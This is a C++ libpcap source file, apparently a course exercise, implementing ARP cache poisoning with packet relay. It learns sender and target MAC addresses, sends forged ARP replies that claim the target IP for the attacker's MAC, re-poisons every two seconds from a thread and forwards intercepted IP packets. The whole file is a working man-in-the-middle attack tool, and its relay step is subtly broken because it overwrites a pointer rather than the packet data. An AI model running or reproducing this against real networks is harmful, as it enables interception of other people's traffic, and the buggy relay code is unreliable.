#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include <stdint.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <libnet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <pthread.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IPv4_hdr{
    unsigned char unnecessary_1[2];
    u_short total_len;
    unsigned char unnecessary_2[8];
    struct in_addr sip;
    struct in_addr dip;
};

static pthread_t thread;
static int thr_id;
Ip sender_ip[101], target_ip[101];
int err_handle;
char my_ip_addr[40];
unsigned char my_mac_addr[6];
unsigned char sender_mac_addr[101][6];
unsigned char target_mac_addr[101][6];
EthArpPacket packet_atk[101];
char* dev;
int pair_num;

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
    printf("sample: send-arp-test wlan0 1.1.1.1 1.1.1.2 \n");
}

int get_my_mac()
{
    struct ifreq ifr;
        struct ifconf ifc;
        char buf[1024];
        int success = 0;

        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
        if (sock == -1) {
            return 0;
        };

        ifc.ifc_len = sizeof(buf);
        ifc.ifc_buf = buf;
        if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
            return 0;
        }

        struct ifreq* it = ifc.ifc_req;
        const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

        for (; it != end; ++it) {
            strcpy(ifr.ifr_name, it->ifr_name);
            if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
                if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                        success = 1;
                        break;
                    }
                }
            }
            else {
                /* handle error */
                return 0;
            }
        }

        if (success){
            memcpy(my_mac_addr, ifr.ifr_hwaddr.sa_data, 6);
        }
        return success;
}

void get_my_ip(char* dev)
{
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
        printf("error");
        return;
    }else{
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, my_ip_addr, sizeof(struct sockaddr));
    }

    close(s);
    return;
}

int arp_or_ip(const u_char* packet){
    EthHdr eth_hdr;
    memcpy(&eth_hdr, packet, sizeof(EthHdr));
    eth_hdr.type_ = ntohs(eth_hdr.type_);
    if(eth_hdr.type_ == EthHdr::Arp){
        return 1;
    }else if(eth_hdr.type_ == EthHdr::Ip4){
        return 2;
    }else{
        return 0;
    }
}

void* thread_atk(void* data){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    while(true){
        for(int i = 1; i <= pair_num; i++){
            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_atk[i]), sizeof(EthArpPacket));
        }
        printf("thread arp atk \n");
        sleep(2);
    }
    pcap_close(handle);
}

int main(int argc, char* argv[]) {
    if ((argc < 4) || (argc % 2 != 0)) {
		usage();
		return -1;
	}

    dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    get_my_ip(dev);
    err_handle = get_my_mac();
    if(err_handle == 0){
        printf("my mac addr error! \n");
        return -1;
    }

    EthArpPacket packet, packet_broad;
    packet_broad.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    int i;
    for(i = 0; i < 6; i++){
    packet_broad.eth_.smac_.mac_[i] = my_mac_addr[i];
    }
    packet_broad.eth_.type_ = htons(EthHdr::Arp);
    packet_broad.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_broad.arp_.pro_ = htons(EthHdr::Ip4);
    packet_broad.arp_.hln_ = Mac::SIZE;
    packet_broad.arp_.pln_ = Ip::SIZE;
    packet_broad.arp_.op_ = htons(ArpHdr::Request);
    for(i = 0; i < 6; i++){
    packet_broad.arp_.smac_.mac_[i] = my_mac_addr[i];
    }
    packet_broad.arp_.sip_ = Ip(my_ip_addr);
    packet_broad.arp_.tmac_ = Mac("00:00:00:00:00:00");
    pair_num = (argc-2) / 2;
    for(i = 1; i <= pair_num; i++){
        sender_ip[i] = htonl(Ip(argv[2 * i]));
        target_ip[i] = htonl(Ip(argv[2 * i + 1]));

        packet_broad.arp_.tip_ = sender_ip[i];

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broad), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return -1;
        }
        struct pcap_pkthdr* header;
        const u_char* packet;
        int k = 0, j = 0;
        while(true){
            if(k >= 100){
                printf("check ip address in usage \n");
                exit(0);
            }
            res = pcap_next_ex(handle, &header, &packet);
            if(res == 0) continue;
            if(res == -1 || res == -2){
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                return -1;
            }

            ArpHdr arp_request, arp_reply;
            arp_request=packet_broad.arp_;
            memcpy(&arp_reply, packet+14, sizeof(ArpHdr));
            if(arp_reply.op_!=htons(ArpHdr::Reply)){
                k++;
                continue;
            }

            if(arp_request.sip_ != arp_reply.tip_){
                k++;
                continue;
            }

            if(arp_request.tip_ != arp_reply.sip_){
                k++;
                continue;
            }

            for(j=0;j<Mac::SIZE;j++){
                sender_mac_addr[i][j]=arp_reply.smac_[j];
            }    
            break;
        }

        packet_broad.arp_.tip_ = target_ip[i];

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broad), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return -1;
        }

        k = 0;

        while(true){
            if(k >= 100){
                printf("check ip address in usage \n");
                exit(0);
            }
            res = pcap_next_ex(handle, &header, &packet);
            if(res == 0) continue;
            if(res == -1 || res == -2){
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                return -1;
            }

            ArpHdr arp_request, arp_reply;
            arp_request=packet_broad.arp_;
            memcpy(&arp_reply, packet+14, sizeof(ArpHdr));
            if(arp_reply.op_!=htons(ArpHdr::Reply)){
                k++;
                continue;
            }

            if(arp_request.sip_ != arp_reply.tip_){
                k++;
                continue;
            }

            if(arp_request.tip_ != arp_reply.sip_){
                k++;
                continue;
            }

            for(j=0;j<Mac::SIZE;j++){
                target_mac_addr[i][j]=arp_reply.smac_[j];
            }    
            break;

        }

        packet_atk[i].eth_.dmac_ = Mac(sender_mac_addr[i]);
        for(j = 0; j < 6; j++){
            packet_atk[i].eth_.smac_.mac_[j] = my_mac_addr[j];
        }
        packet_atk[i].eth_.type_ = htons(EthHdr::Arp);
        packet_atk[i].arp_.hrd_ = htons(ArpHdr::ETHER);
        packet_atk[i].arp_.pro_ = htons(EthHdr::Ip4);
        packet_atk[i].arp_.hln_ = Mac::SIZE;
        packet_atk[i].arp_.pln_ = Ip::SIZE;
        packet_atk[i].arp_.op_ = htons(ArpHdr::Reply);
        for(j = 0; j < 6; j++){
            packet_atk[i].arp_.smac_.mac_[j] = my_mac_addr[j];
        }
        packet_atk[i].arp_.sip_ = target_ip[i];
        for(j = 0; j < 6; j++){
            packet_atk[i].arp_.tmac_.mac_[j] = sender_mac_addr[i][j];
        }
        packet_atk[i].arp_.tip_ = sender_ip[i];

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_atk[i]), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return -1;
        }
        printf("sender %d attack success \n", i);
    }
    //at this point, we get (ip, mac) of (sender, target) and send arp-atk packet
    thr_id = pthread_create(&thread, NULL, thread_atk, NULL);


    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return -1;
        }
        int type = arp_or_ip(packet);

        if(type == 0){
            printf("this packet isn't arp nor ip \n");
            continue;
        }else if(type == 1){ // arp packet
            printf("this packet is arp packet \n");
            ArpHdr arp_hdr;
            memcpy(&arp_hdr, packet+14, sizeof(ArpHdr));
            if(arp_hdr.op_ != htons(ArpHdr::Request) || arp_hdr.hrd_ != htons(ArpHdr::ETHER)){
                continue;
            }
            for(i = 1; i <= pair_num; i++){
                if(arp_hdr.smac_ == packet_atk[i].arp_.tmac_){ // packet_atk.arp_tmac_ : sender mac
                    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_atk[i]), sizeof(EthArpPacket));
                    printf("arp atk to sender %d \n", i);
                    break;
                }else if(arp_hdr.sip_ == target_ip[i]){
                    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_atk[i]), sizeof(EthArpPacket));
                    printf("arp atk to sender %d \n", i);
                    break;
                }else{
                    continue;
                }
            }
        }else{ // ip packet
            printf("this packet is ip packet \n");
            EthHdr eth_hdr;
            IPv4_hdr ip_hdr;
            memcpy(&eth_hdr, packet, sizeof(EthHdr));
            memcpy(&ip_hdr, packet+14, sizeof(IPv4_hdr));
            for(i = 1; i <= pair_num; i++){
                if(eth_hdr.smac_ == packet_atk[i].arp_.tmac_){ // packet_atk.arp_.tamc_ : sender mac
                    eth_hdr.smac_ = packet_broad.eth_.smac_; // packet_broad.eth_.smac_ : my mac
                    for(int j = 0; j < 6; j++){
                        eth_hdr.dmac_.mac_[j] = target_mac_addr[i][j];
                    }
                    int packetlen = header->caplen;

                    memcpy(&packet, &eth_hdr, sizeof(EthHdr));
                    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), packetlen * sizeof(u_char));
                    printf("ip relay to target %d \n", i);
                    break;
                }
            }
        }
    }
	pcap_close(handle);
    return 0;

}
